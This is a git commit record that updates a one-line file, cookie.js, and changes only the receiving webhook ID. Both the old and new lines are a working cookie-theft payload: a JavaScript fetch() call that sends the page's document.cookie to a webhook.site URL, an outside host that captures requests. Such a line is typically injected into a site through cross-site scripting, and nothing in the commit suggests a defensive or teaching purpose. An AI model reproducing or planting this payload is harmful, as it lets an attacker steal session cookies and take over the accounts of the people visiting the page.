51024430d691530ad5b1af83f8eb738d6beed200
ineedaspo1 <seancameronbaker@gmail.com>
2023-05-24 22:17:44 -0400

    Update cookie.js

--- cookie.js
+++ cookie.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/ac414bc7-3d97-4887-a81b-1e728e6f9704?cookie=' + document.cookie);
+fetch('https://webhook.site/e806aa40-86de-49f6-a14f-ec14330849a0?cookie=' + document.cookie);
